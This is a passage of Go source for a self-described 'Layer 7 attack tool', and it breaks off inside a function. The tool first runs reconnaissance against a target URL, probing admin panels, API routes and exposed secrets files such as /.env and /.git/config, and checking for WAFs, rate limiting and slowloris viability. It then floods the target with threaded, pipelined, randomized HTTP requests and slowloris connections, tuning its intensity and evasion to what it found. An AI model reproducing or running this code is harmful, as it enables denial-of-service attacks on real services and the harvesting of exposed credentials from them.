// Usage:
//
//	go run main.go <URL> <THREADS> <DURATION_SEC> [CUSTOM_HOST]
package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"log/slog"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// ─── Config ───────────────────────────────────────────────────────────────────

type StressConfig struct {
	Target         *url.URL
	Threads        int
	Duration       time.Duration
	CustomHost     string
	Port           int
	Path           string
	IsTLS          bool
	ConnPerWorker  int
	PipelinedReqs  int
	SlowlorisDelay time.Duration
	ReconResults   *ReconResult
}

// ─── ReconResult ──────────────────────────────────────────────────────────────
// Stores findings from the reconnaissance phase so the attack can adapt.

type ReconResult struct {
	mu               sync.RWMutex
	ServerSoftware   string
	SupportedMethods []string
	OpenEndpoints    []string
	AdminPanels      []string
	APIEndpoints     []string
	AuthEndpoints    []string
	BaselineLatency  time.Duration
	SlowlorisWorks   bool
	FoundAPIKey      bool
	APIKeyEndpoints  []string

	// ── Enhanced recon fields (v2) ────────────────────────────────────────────
	WAFDetected       bool
	WAFTypes          []string
	ServerType        string
	ServerVersion     string
	HTTP2Support      bool
	CORSAllowedOrigin string
	CORSEnabled       bool
	RateLimitDetected bool
	RateLimitInfo     string
	HTTPRateLimitCode int
	SecurityHeaders   map[string]bool
	CMSName           string
	CMSVersion        string
	ReconDuration     time.Duration
	EndpointCount     int
	WAFUserAgent      string
	GranularRateLimit bool
}

func NewReconResult() *ReconResult {
	return &ReconResult{
		SupportedMethods: []string{"GET", "POST"},
		OpenEndpoints:    []string{"/"},
		SecurityHeaders:  make(map[string]bool),
		WAFTypes:         []string{},
	}
}

func (r *ReconResult) recordEndpoint(endpoint string, status int, server string) {
	r.mu.Lock()
	defer r.mu.Unlock()

	if server != "" && r.ServerSoftware == "" {
		r.ServerSoftware = server
	}

	lower := strings.ToLower(endpoint)
	if status == 200 || status == 301 || status == 302 {
		for _, e := range r.OpenEndpoints {
			if e == endpoint {
				return
			}
		}
		r.OpenEndpoints = append(r.OpenEndpoints, endpoint)
	}
	if strings.Contains(lower, "admin") || strings.Contains(lower, "wp-admin") ||
		strings.Contains(lower, "dashboard") || strings.Contains(lower, "cpanel") ||
		strings.Contains(lower, "administrator") {
		r.AdminPanels = appendIfMissing(r.AdminPanels, endpoint)
	}
	if strings.Contains(lower, "api") || strings.Contains(lower, "swagger") ||
		strings.Contains(lower, "graphql") || strings.Contains(lower, "docs") {
		r.APIEndpoints = appendIfMissing(r.APIEndpoints, endpoint)
	}
	if strings.Contains(lower, "login") || strings.Contains(lower, "auth") ||
		strings.Contains(lower, "signin") || strings.Contains(lower, "register") {
		r.AuthEndpoints = appendIfMissing(r.AuthEndpoints, endpoint)
	}
}

func (r *ReconResult) recordMethod(method string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	for _, m := range r.SupportedMethods {
		if strings.EqualFold(m, method) {
			return
		}
	}
	r.SupportedMethods = append(r.SupportedMethods, method)
}

func (r *ReconResult) GetAttackEndpoints() []string {
	r.mu.RLock()
	defer r.mu.RUnlock()

	seen := make(map[string]bool)
	var result []string
	priority := [][]string{r.AdminPanels, r.APIEndpoints, r.AuthEndpoints, r.OpenEndpoints}
	for _, group := range priority {
		for _, e := range group {
			if !seen[e] {
				result = append(result, e)
				seen[e] = true
			}
		}
	}
	return result
}

func appendIfMissing(slice []string, val string) []string {
	for _, s := range slice {
		if s == val {
			return slice
		}
	}
	return append(slice, val)
}

// ─── HTTP helpers ─────────────────────────────────────────────────────────────

var (
	httpMethods = []string{
		"GET", "GET", "GET", "GET", "GET", "GET",
		"POST", "POST", "POST",
		"PUT", "DELETE", "PATCH",
		"HEAD", "OPTIONS", "TRACE", "CONNECT",
	}

	destructiveMethods = []string{"PUT", "DELETE", "PATCH", "TRACE", "CONNECT", "PROPFIND", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK"}

	paths = []string{
		"/", "/index.html", "/about", "/contact", "/products",
		"/api/v1/users", "/api/v1/items", "/api/v1/search",
		"/api/v1/users/create", "/api/v1/users/delete", "/api/v1/admin",
		"/login", "/register", "/dashboard", "/settings",
		"/static/js/app.js", "/static/css/style.css",
		"/images/logo.png", "/favicon.ico", "/robots.txt",
		"/sitemap.xml", "/feed/rss", "/wp-admin", "/wp-login.php",
		"/profile", "/logout", "/help", "/faq", "/terms",
		"/api/v2/users", "/api/graphql", "/api/v1/export",
		"/api/v1/import", "/api/v1/backup", "/api/v1/config",
		"/api/v1/debug", "/api/v1/console", "/api/v1/shell",
		"/cgi-bin/test", "/cgi-bin/printenv", "/cgi-bin/env",
		"/.git/HEAD", "/.svn/entries", "/.hg/dirstate",
		"/.DS_Store", "/Thumbs.db", "/web.config",
		"/backup.sql", "/database.sql", "/dump.sql",
		"/.htaccess", "/.htpasswd", "/wp-config.php.bak",
		"/admin/config", "/admin/restore", "/admin/exec",
		"/actuator/env", "/actuator/refresh", "/actuator/startup",
		"/solr/admin/cores", "/jenkins/script", "/manager/html",
	}

	cacheBusters = []string{
		"", "_cb=%d", "?_cb=%d", "&_cb=%d",
		"?nocache=%d", "&nocache=%d",
		"?v=%d", "&v=%d",
		"?t=%d", "&t=%d",
		"?rand=%d", "&rand=%d",
	}

	contentTypes = []string{
		"application/x-www-form-urlencoded",
		"application/json",
		"text/plain",
		"multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
		"application/xml",
		"application/octet-stream",
	}

	languages = []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.8",
		"fr-FR,fr;q=0.9,en-US;q=0.8",
		"de-DE,de;q=0.9,en-US;q=0.8",
		"es-ES,es;q=0.9,en-US;q=0.8",
		"ja-JP,ja;q=0.9,en-US;q=0.8",
		"zh-CN,zh;q=0.9,en;q=0.8",
		"ko-KR,ko;q=0.9,en;q=0.8",
		"pt-BR,pt;q=0.9,en;q=0.8",
		"ru-RU,ru;q=0.9,en;q=0.8",
	}

	acceptHeaders = []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	}

	bufPool = sync.Pool{New: func() any { return new(bytes.Buffer) }}
)

// ─── Manager ──────────────────────────────────────────────────────────────────

type Manager struct {
	cfg StressConfig

	ipsMu       sync.Mutex
	ips         []string
	rebalanceCh chan []string

	totalReqs    atomic.Int64
	totalErrors  atomic.Int64
	totalLatency atomic.Int64
	workerID     atomic.Int64

	circuitMu        sync.Mutex
	circuitFailures  map[string]int64
	circuitThreshold int64
	circuitCooldown  time.Duration
	circuitTripped   map[string]time.Time
}

func NewManager(cfg StressConfig) *Manager {
	return &Manager{
		cfg:              cfg,
		rebalanceCh:      make(chan []string, 1),
		circuitFailures:  make(map[string]int64),
		circuitTripped:   make(map[string]time.Time),
		circuitThreshold: 10,
		circuitCooldown:  5 * time.Second,
	}
}

func (m *Manager) updateIPs(newIPs []string) {
	m.ipsMu.Lock()
	m.ips = newIPs
	m.ipsMu.Unlock()
}

func (m *Manager) snapshotIPs() []string {
	m.ipsMu.Lock()
	defer m.ipsMu.Unlock()
	out := make([]string, len(m.ips))
	copy(out, m.ips)
	return out
}

// ─── Entry point ──────────────────────────────────────────────────────────────

func main() {
	if len(os.Args) < 4 {
		fmt.Fprintf(os.Stderr, "Usage: %s <URL> <THREADS> <DURATION_SEC> [CUSTOM_HOST]\n", os.Args[0])
		os.Exit(1)
	}

	threads, err := strconv.Atoi(os.Args[2])
	if err != nil || threads <= 0 {
		fmt.Fprintf(os.Stderr, "Invalid THREADS (%q): must be a positive integer.\n", os.Args[2])
		os.Exit(1)
	}
	durSec, err := strconv.Atoi(os.Args[3])
	if err != nil || durSec <= 0 {
		fmt.Fprintf(os.Stderr, "Invalid DURATION_SEC (%q): must be a positive integer.\n", os.Args[3])
		os.Exit(1)
	}

	rawURL := os.Args[1]
	parsedURL, err := url.Parse(rawURL)
	if err != nil || parsedURL.Scheme == "" || parsedURL.Hostname() == "" {
		fmt.Fprintf(os.Stderr, "Invalid URL: %q\n", rawURL)
		os.Exit(1)
	}
	if parsedURL.Scheme != "http" && parsedURL.Scheme != "https" {
		fmt.Fprintf(os.Stderr, "URL scheme must be http or https, got %q\n", parsedURL.Scheme)
		os.Exit(1)
	}

	customHost := ""
	for _, arg := range os.Args[4:] {
		if customHost == "" {
			customHost = arg
		}
	}

	path := parsedURL.RequestURI()
	if path == "" {
		path = "/"
	}

	cfg := StressConfig{
		Target:         parsedURL,
		Threads:        threads,
		Duration:       time.Duration(durSec) * time.Second,
		CustomHost:     customHost,
		Port:           determinePort(parsedURL),
		Path:           path,
		IsTLS:          parsedURL.Scheme == "https",
		ConnPerWorker:  5,
		PipelinedReqs:  10,
		SlowlorisDelay: 2 * time.Second,
		ReconResults:   NewReconResult(),
	}

	addrs, err := lookupIPv4(parsedURL.Hostname())
	if err != nil {
		fmt.Fprintf(os.Stderr, "Initial DNS lookup failed: %v\n", err)
		os.Exit(1)
	}
	slog.Info("resolved IPs", "ips", addrs)

	printReconBanner()
	slog.Info("starting reconnaissance phase", "target", rawURL)

	reconResults := reconTarget(cfg)
	cfg.ReconResults = reconResults

	applyReconAdaptations(&cfg, reconResults)

	printReconResults(reconResults, cfg)

	mgr := NewManager(cfg)
	mgr.updateIPs(addrs)

	rootCtx, cancel := context.WithTimeout(context.Background(), cfg.Duration)
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	go func() {
		select {
		case <-sigCh:
			slog.Info("interrupt received; shutting down early")
			cancel()
		case <-rootCtx.Done():
		}
	}()

	go mgr.dnsRefresh(rootCtx, parsedURL.Hostname(), 30*time.Second)
	go mgr.runStats(rootCtx, 5*time.Second)

	printAttackBanner(cfg)
	slog.Info("attack starting",
		"url", rawURL, "threads", threads,
		"duration", cfg.Duration,
		"conn_per_worker", cfg.ConnPerWorker,
		"pipelined_reqs", cfg.PipelinedReqs,
		"slowloris_auto", cfg.ReconResults.SlowlorisWorks,
	)
	mgr.runManager(rootCtx)
	slog.Info("attack completed",
		"requests", mgr.totalReqs.Load(),
		"errors", mgr.totalErrors.Load(),
	)
}

// ─── Recon helpers ────────────────────────────────────────────────────────────

func printReconBanner() {
	fmt.Println()
	fmt.Println("╔══════════════════════════════════════════════════════════╗")
	fmt.Println("║        LAYER 7 ATTACK TOOL — RECONNAISSANCE PHASE        ║")
	fmt.Println("╚══════════════════════════════════════════════════════════╝")
	fmt.Println("  Running automatic target analysis...")
	fmt.Println()
}

func printReconResults(r *ReconResult, cfg StressConfig) {
	fmt.Println()
	fmt.Println("  ─── Reconnaissance Complete ───")

	fmt.Printf("  Server Software : %s\n", ternaryStr(r.ServerSoftware != "", r.ServerSoftware, "Unknown"))
	if r.ServerType != "" {
		fmt.Printf("  Server Type     : %s%s\n", r.ServerType, ternaryStr(r.ServerVersion != "", fmt.Sprintf(" %s", r.ServerVersion), ""))
	}

	if r.WAFDetected {
		wafDesc := strings.Join(r.WAFTypes, ", ")
		fmt.Printf("  WAF/CDN         : DETECTED — %s\n", wafDesc)
	} else {
		fmt.Println("  WAF/CDN         : None detected")
	}

	if r.HTTP2Support {
		fmt.Println("  HTTP/2 Support  : Detected (h2)")
	} else {
		fmt.Println("  HTTP/2 Support  : Not detected (HTTP/1.1 only)")
	}

	missingHeaders := []string{}
	for _, h := range []string{"X-Frame-Options", "Content-Security-Policy", "X-XSS-Protection",
		"Strict-Transport-Security", "X-Content-Type-Options"} {
		if !r.SecurityHeaders[h] {
			missingHeaders = append(missingHeaders, h)
		}
	}
	fmt.Printf("  Security Headers: %d present (missing: %s)\n", len(r.SecurityHeaders), strings.Join(missingHeaders, ", "))

	if r.CORSEnabled {
		fmt.Printf("  CORS            : MISCONFIGURED — Allow-Origin: %s\n", r.CORSAllowedOrigin)
	} else {
		fmt.Println("  CORS            : No overly permissive origins detected")
	}

	if r.RateLimitDetected {
		fmt.Printf("  Rate Limiting   : Detected — %s\n", ternaryStr(r.RateLimitInfo != "", r.RateLimitInfo, "unknown"))
	} else {
		fmt.Println("  Rate Limiting   : Not detected")
	}

	if r.CMSName != "" {
		fmt.Printf("  CMS             : %s%s\n", r.CMSName, ternaryStr(r.CMSVersion != "", fmt.Sprintf(" (%s)", r.CMSVersion), ""))
	}

	fmt.Printf("  Methods         : %s\n", strings.Join(r.SupportedMethods, ", "))
	fmt.Printf("  Open Endpoints  : %d (probed %d)\n", len(r.OpenEndpoints), r.EndpointCount)
	fmt.Printf("  Admin Panels    : %d\n", len(r.AdminPanels))
	fmt.Printf("  API Endpoints   : %d\n", len(r.APIEndpoints))
	fmt.Printf("  Auth Endpoints  : %d\n", len(r.AuthEndpoints))

	fmt.Printf("  Baseline Latency: %v\n", r.BaselineLatency)
	if r.ReconDuration > 0 {
		fmt.Printf("  Recon Duration  : %v\n", r.ReconDuration)
	}
	fmt.Printf("  Slowloris Viable: %v\n", ternaryBool(r.SlowlorisWorks))

	if r.FoundAPIKey && len(r.APIKeyEndpoints) > 0 {
		fmt.Printf("  ⚠ Key Endpoints : %s\n", strings.Join(r.APIKeyEndpoints, ", "))
	}

	fmt.Println()
	fmt.Println("  ─── Adaptive Settings Applied ───")
	fmt.Printf("  Connections/Worker: %d (was 5)\n", cfg.ConnPerWorker)
	fmt.Printf("  Pipelined Requests: %d (was 10)\n", cfg.PipelinedReqs)

	if len(r.AdminPanels) > 0 {
		fmt.Println("  ⚔ Admin panels detected — aggressive mode enabled")
	}
	if r.WAFDetected {
		wafDesc := strings.Join(r.WAFTypes, ", ")
		fmt.Printf("  🛡 WAF %s detected — randomized evasion patterns activated\n", wafDesc)
	}
	if r.HTTP2Support {
		fmt.Println("  ⚡ HTTP/2 slowloris mode enabled")
	}
	if r.CORSEnabled {
		fmt.Printf("  🌐 CORS misconfigured (%s) — cross-origin attacks ready\n", r.CORSAllowedOrigin)
	}
	if len(r.APIEndpoints) > 0 {
		fmt.Println("  API endpoints detected — pipelining increased")
	}
	if r.SlowlorisWorks {
		fmt.Println("  🕷 Slowloris mode active (HTTP/1.1)")
	}
	if r.GranularRateLimit {
		fmt.Println("  ⏱ Granular per-IP rate limiting detected — distributed attack required")
	}

	fmt.Println()
}

func printAttackBanner(cfg StressConfig) {
	fmt.Println("╔══════════════════════════════════════════════════════════╗")
	fmt.Println("║            LAYER 7 ATTACK TOOL — ATTACK PHASE            ║")
	fmt.Println("╚══════════════════════════════════════════════════════════╝")
	endpoints := cfg.ReconResults.GetAttackEndpoints()
	if len(endpoints) > 0 {
		fmt.Printf("  Targeting %d endpoints (recon-informed random selection)\n", len(endpoints))
	}
	fmt.Printf("  Randomized methods: %s\n", strings.Join(cfg.ReconResults.SupportedMethods, ", "))
	fmt.Println()
}

func ternaryStr(cond bool, a, b string) string {
	if cond {
		return a
	}
	return b
}

func ternaryBool(v bool) string {
	if v {
		return "Yes"
	}
	return "No"
}

func applyReconAdaptations(cfg *StressConfig, r *ReconResult) {
	r.mu.RLock()
	defer r.mu.RUnlock()

	baseConn := 5
	basePipe := 10

	endpointCount := len(r.OpenEndpoints) + len(r.AdminPanels)*3 + len(r.APIEndpoints)*2 + len(r.AuthEndpoints)
	if endpointCount > 20 {
		baseConn = 8
		basePipe = 15
	}
	if endpointCount > 50 {
		baseConn = 10
		basePipe = 20
	}

	if len(r.AdminPanels) > 0 {
		baseConn = max(baseConn, 8)
		basePipe = max(basePipe, 15)
	}

	if len(r.APIEndpoints) > 0 {
		basePipe = max(basePipe, 20)
	}

	if len(r.AuthEndpoints) > 0 {
		baseConn = max(baseConn, 8)
	}

	if r.SlowlorisWorks {
		baseConn = max(baseConn, 15)
	}

	if r.WAFDetected {
		baseConn = max(baseConn, 10)
		basePipe = max(basePipe, 25)
	}

	if r.HTTP2Support {
		baseConn = max(baseConn, 12)
		cfg.SlowlorisDelay = 3 * time.Second
		slog.Info("HTTP/2 detected — enabling stream-based slowloris")
	}

	if r.CORSEnabled {
		basePipe = max(basePipe, 15)
	}

	if r.GranularRateLimit {
		baseConn = max(baseConn, 12)
		slog.Info("per-IP rate limiting detected — increasing connection diversity")
	}

	if r.CMSName != "" && (r.CMSName == "WordPress" || r.CMSName == "Drupal" || r.CMSName == "Joomla") {
		baseConn = max(baseConn, 10)
		basePipe = max(basePipe, 20)
	}

	if len(r.SecurityHeaders) < 3 {
		baseConn = max(baseConn, 8)
		slog.Info("low security header count — increasing attack intensity")
	}

	if r.EndpointCount > 200 {
		baseConn = max(baseConn, 10)
		basePipe = max(basePipe, 20)
	}

	cfg.ConnPerWorker = baseConn
	cfg.PipelinedReqs = basePipe
}

// ─── Recon: target probing ───────────────────────────────────────────────────

func reconTarget(cfg StressConfig) *ReconResult {
	results := NewReconResult()
	hostHdr := cfg.CustomHost
	if hostHdr == "" {
		hostHdr = cfg.Target.Hostname()
	}
	addr := fmt.Sprintf("%s:%d", cfg.Target.Hostname(), cfg.Port)

	reconCtx, reconCancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer reconCancel()

	results.SupportedMethods = reconCheckMethods(reconCtx, addr, cfg, hostHdr)

	commonEndpoints := []string{
		"/", "/index.html", "/about", "/contact", "/products",
		"/api", "/api/v1", "/api/v1/users", "/api/v1/search",
		"/admin", "/wp-admin", "/wp-login.php", "/administrator",
		"/dashboard", "/login", "/register", "/signin", "/auth",
		"/settings", "/profile", "/logout", "/help", "/faq", "/terms",
		"/static/js/app.js", "/static/css/style.css", "/images/logo.png",
		"/favicon.ico", "/robots.txt", "/sitemap.xml", "/feed/rss",
		"/.env", "/.git/config", "/config.php", "/wp-config.php",
		"/phpinfo.php", "/info.php", "/server-status", "/server-info",
		"/actuator", "/actuator/health", "/actuator/info",
		"/swagger-ui.html", "/swagger-ui/", "/api-docs", "/graphql",
		"/console", "/debug", "/trace", "/metrics", "/health",
		"/cgi-bin/", "/test.php", "/info.html", "/status",
	}

	var baselineDurations []time.Duration
	for _, ep := range commonEndpoints {
		if reconCtx.Err() != nil {
			break
		}
		status, server, latency := reconProbeEndpoint(reconCtx, addr, cfg, hostHdr, ep)
		results.recordEndpoint(ep, status, server)
		if latency > 0 {
			baselineDurations = append(baselineDurations, latency)
		}
	}

	if len(baselineDurations) > 0 {
		var total time.Duration
		for _, d := range baselineDurations {
			total += d
		}
		results.BaselineLatency = total / time.Duration(len(baselineDurations))
	}

	results.SlowlorisWorks = reconTestSlowloris(reconCtx, addr, cfg, hostHdr)

	apiKeyEndpoints := []string{
		"/api/v1/config", "/api/config", "/.env", "/config.json",
		"/config.yaml", "/config.yml", "/api/keys", "/api/v1/keys",
	}
	for _, ep := range apiKeyEndpoints {
		if reconCtx.Err() != nil {
			break
		}
		status, _, _ := reconProbeEndpoint(reconCtx, addr, cfg, hostHdr, ep)
		if status == 200 {
			results.FoundAPIKey = true
			results.APIKeyEndpoints = append(results.APIKeyEndpoints, ep)
		}
	}

	results.WAFTypes = results.WAFTypes
	if len(results.WAFTypes) > 0 {
		results.WAFDetected = true
	}

	if results.ServerSoftware != "" {
		results.ServerType, results.ServerVersion = detectServerType(results.ServerSoftware)
	}

	results.HTTP2Support = detectHTTP2(reconCtx, addr, cfg, hostHdr)

	results.CORSEnabled, results.CORSAllowedOrigin = detectCORS(reconCtx, addr, cfg, hostHdr)

	results.RateLimitDetected, results.RateLimitInfo, results.HTTPRateLimitCode, results.GranularRateLimit =
		detectRateLimiting(reconCtx, addr, cfg, hostHdr)

	results.CMSName, results.CMSVersion = detectCMS(reconCtx, addr, cfg, hostHdr)

	results.SecurityHeaders = analyzeSecurityHeadersFromProbes(reconCtx, addr, cfg, hostHdr, commonEndpoints[:min(5, len(commonEndpoints))])

	return results
}

func reconCheckMethods(ctx context.Context, addr string, cfg StressConfig, hostHdr string) []string {
	conn, err := dialConn(ctx, addr, cfg.IsTLS, hostHdr)
	if err != nil {
		slog.Debug("recon: dial failed for method check", "err", err)
		return []string{"GET", "POST"}
	}
	defer conn.Close()

	req := fmt.Sprintf("OPTIONS / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", hostHdr)
	conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
	if _, err := conn.Write([]byte(req)); err != nil {
		return []string{"GET", "POST"}
	}
	conn.SetWriteDeadline(time.Time{})

	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	var buf [4096]byte
	n, err := conn.Read(buf[:])
	conn.SetReadDeadline(time.Time{})
	if err != nil && n == 0 {
		return []string{"GET", "POST"}
	}

	resp := string(buf[:n])
	var found []string
	for _, line := range strings.Split(resp, "\r\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(strings.ToLower(line), "allow:") {
			colonIdx := strings.Index(line, ":")
			if colonIdx < 0 {
				continue
			}
			allow := strings.TrimSpace(line[colonIdx+1:])
			for _, m := range strings.Split(allow, ",") {
				m = strings.TrimSpace(m)
				if m != "" {
					found = append(found, m)
				}
			}
		}
	}

	if len(found) == 0 {
		found = []string{"GET", "POST"}
	}
	return found
}

func reconProbeEndpoint(ctx context.Context, addr string, cfg StressConfig, hostHdr, endpoint string) (status int, server string, latency time.Duration) {
	conn, err := dialConn(ctx, addr, cfg.IsTLS, hostHdr)
	if err != nil {
		return 0, "", 0
	}
	defer conn.Close()

	start := time.Now()
	req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\nAccept: text/html\r\n\r\n", endpoint, hostHdr)
	conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
	if _, err := conn.Write([]byte(req)); err != nil {
		return 0, "", 0
	}
	conn.SetWriteDeadline(time.Time{})

	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	var buf [4096]byte
	n, err := conn.Read(buf[:])
	conn.SetReadDeadline(time.Time{})
	latency = time.Since(start)

	if err != nil && n == 0 {
		return 0, "", latency
	}

	resp := string(buf[:n])
	for _, line := range strings.Split(resp, "\r\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "HTTP/") {
			parts := strings.Split(line, " ")
			if len(parts) >= 2 {
				if code, err := strconv.Atoi(parts[1]); err == nil {
					status = code
				}
			}
			break
		}
	}
	for _, line := range strings.Split(resp, "\r\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(strings.ToLower(line), "server:") {
			server = strings.TrimSpace(line[7:])
		}
	}

	return status, server, latency
}

func reconTestSlowloris(ctx context.Context, addr string, cfg StressConfig, hostHdr string) bool {
	conn, err := dialConn(ctx, addr, cfg.IsTLS, hostHdr)
	if err != nil {
		return false
	}

	headers := []string{
		"GET / HTTP/1.1\r\n",
		"Host: " + hostHdr + "\r\n",
		"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n",
	}

	for _, h := range headers {
		conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
		if _, err := conn.Write([]byte(h)); err != nil {
			conn.Close()
			return false
		}
	}

	select {
	case <-ctx.Done():
		conn.Close()
		return false
	case <-time.After(2 * time.Second):
		conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
		_, err := conn.Write([]byte("X-Mystery: test\r\n"))
		conn.SetWriteDeadline(time.Time{})
		conn.Close()
		return err == nil
	}
}

// ─── Enhanced Recon Helpers (v2) ──────────────────────────────────────────────

func detectWAF(headers http.Header) []string {
	var wafTypes []string

	wafHeaders := map[string]string{
		"x-sucuri-id":     "Sucuri",
		"cf-ray":          "Cloudflare",
		"cf-cache-status": "Cloudflare",
		"x-amz-cf-id":     "AWS CloudFront",
		"x-akamai":        "Akamai",
		"x-pm-apache":     "Palo Alto",
		"x-sucuri-city":   "Sucuri",
		"x-sucuri-ip":     "Sucuri",
		"server-timing":   "Cloudflare",
	}

	for header, wafName := range wafHeaders {
		if _, ok := headers[http.CanonicalHeaderKey(header)]; ok {
			wafTypes = append(wafTypes, wafName)
		}
	}

	if cfRay := headers.Get("cf-ray"); cfRay != "" && !containsWAFType(wafTypes, "Cloudflare") {
		wafTypes = append(wafTypes, "Cloudflare")
	}

	for _, v := range headers.Values("x-accel-expires") {
		if v == "0" || strings.HasPrefix(v, "/") {
			wafTypes = append(wafTypes, "Akamai")
			break
		}
	}

	return wafTypes
}

// ─── Manager: worker lifecycle ────────────────────────────────────────────────

type workerEntry struct{ cancel context.CancelFunc }

func (m *Manager) runManager(ctx context.Context) {
	workers := make(map[string][]workerEntry)
	spawn := func(ip string) {
		wctx, wcancel := context.WithCancel(ctx)
		workers[ip] = append(workers[ip], workerEntry{cancel: wcancel})
		go m.workerLoop(wctx, ip)
	}

	m.rebalance(m.snapshotIPs(), workers, spawn)

	for {
		select {
		case <-ctx.Done():
			for _, list := range workers {
				for _, w := range list {
					w.cancel()
				}
			}
			return
		case newIPs := <-m.rebalanceCh:
			m.rebalance(newIPs, workers, spawn)
		}
	}
}

func (m *Manager) rebalance(ipsList []string, workers map[string][]workerEntry, spawn func(string)) {
	n := len(ipsList)
	if n == 0 {
		for ip, list := range workers {
			for _, w := range list {
				w.cancel()
			}
			delete(workers, ip)
		}
		slog.Warn("rebalance: no IPs available; all workers cancelled")
		return
	}

	base := m.cfg.Threads / n
	extra := m.cfg.Threads % n
	desired := make(map[string]int, n)
	for i, ip := range ipsList {
		desired[ip] = base
		if i < extra {
			desired[ip]++
		}
	}

	for ip, list := range workers {
		if _, ok := desired[ip]; !ok {
			for _, w := range list {
				w.cancel()
			}
			delete(workers, ip)
		}
	}

	for ip, want := range desired {
		have := len(workers[ip])
		for i := 0; i < want-have; i++ {
			spawn(ip)
		}
		for i := 0; i < have-want; i++ {
			w := workers[ip][0]
			w.cancel()
			workers[ip] = workers[ip][1:]
		}
	}

	slog.Info("rebalance complete", "desired", desired, "running", mapCounts(workers))
}

func mapCounts(workers map[string][]workerEntry) map[string]int {
	out := make(map[string]int, len(workers))
	for ip, list := range workers {
		out[ip] = len(list)
	}
	return out
}

// ─── Worker loop ──────────────────────────────────────────────────────────────

func (m *Manager) workerLoop(ctx context.Context, ip string) {
	seed := m.workerID.Add(1) + time.Now().UnixNano()
	rng := rand.New(rand.NewSource(seed))

	hostHdr := m.cfg.Target.Hostname()
	if m.cfg.CustomHost != "" {
		hostHdr = m.cfg.CustomHost
	}

	addr := fmt.Sprintf("%s:%d", ip, m.cfg.Port)
	backoff := 50 * time.Millisecond

	for ctx.Err() == nil {
		var wg sync.WaitGroup
		spawned := 0

		for connIdx := 0; connIdx < m.cfg.ConnPerWorker; connIdx++ {
			if ctx.Err() != nil {
				break
			}

			if m.isCircuitTripped(ip) {
				time.Sleep(500 * time.Millisecond)
				continue
			}

			conn, err := dialConn(ctx, addr, m.cfg.IsTLS, hostHdr)
			if err != nil {
				m.totalErrors.Add(1)
				m.recordFailure(ip)
				select {
				case <-ctx.Done():
					wg.Wait()
					return
				case <-time.After(backoff):
				}
				backoff = min(backoff*2, 5*time.Second)
				continue
			}
			m.recordSuccess(ip)
			backoff = 50 * time.Millisecond

			spawned++
			wg.Add(1)
			go func() {
				defer wg.Done()
				if m.cfg.ReconResults.SlowlorisWorks {
					m.slowlorisWorker(ctx, conn, rng, hostHdr)
				} else {
					m.connectionWorker(ctx, conn, rng, hostHdr)
				}
				conn.Close()
			}()
		}

		wg.Wait()

		if spawned == 0 {
			select {
			case <-ctx.Done():
				return
			case <-time.After(backoff):
			}
			backoff = min(backoff*2, 5*time.Second)
			continue
		}

		select {
		case <-ctx.Done():
			return
		case <-time.After(200 * time.Millisecond):
		}
	}
}

func (m *Manager) isCircuitTripped(ip string) bool {
	m.circuitMu.Lock()
	defer m.circuitMu.Unlock()
	if _, ok := m.circuitTripped[ip]; !ok {
		return false
	}
	if time.Since(m.circuitTripped[ip]) > m.circuitCooldown {
		delete(m.circuitTripped, ip)
		m.circuitFailures[ip] = 0
		return false
	}
	return true
}

func (m *Manager) recordSuccess(ip string) {
	m.circuitMu.Lock()
	defer m.circuitMu.Unlock()
	m.circuitFailures[ip] = 0
}

func (m *Manager) recordFailure(ip string) {
	m.circuitMu.Lock()
	defer m.circuitMu.Unlock()
	m.circuitFailures[ip]++
	if m.circuitFailures[ip] >= m.circuitThreshold {
		m.circuitTripped[ip] = time.Now()
		slog.Debug("circuit breaker tripped", "ip", ip, "failures", m.circuitFailures[ip])
	}
}

func containsWAFType(types []string, target string) bool {
	for _, t := range types {
		if strings.EqualFold(t, target) {
			return true
		}
	}
	return false
}

func analyzeSecurityHeaders(headers http.Header) map[string]bool {
	result := make(map[string]bool)
	for _, h := range []string{
		"x-frame-options", "content-security-policy", "x-xss-protection",
		"strict-transport-security", "x-content-type-options",
	} {
		if headers.Get(http.CanonicalHeaderKey(h)) != "" {
			result[h] = true
		} else {
			result[h] = false
		}
	}
	return result
}

func analyzeSecurityHeadersFromProbes(ctx context.Context, addr string, cfg StressConfig, hostHdr string, endpoints []string) map[string]bool {
	result := make(map[string]bool)
	for _, ep := range endpoints {
		if ctx.Err() != nil {
			break
		}
		conn, err := dialConn(ctx, addr, cfg.IsTLS, hostHdr)
		if err != nil {
			continue
		}

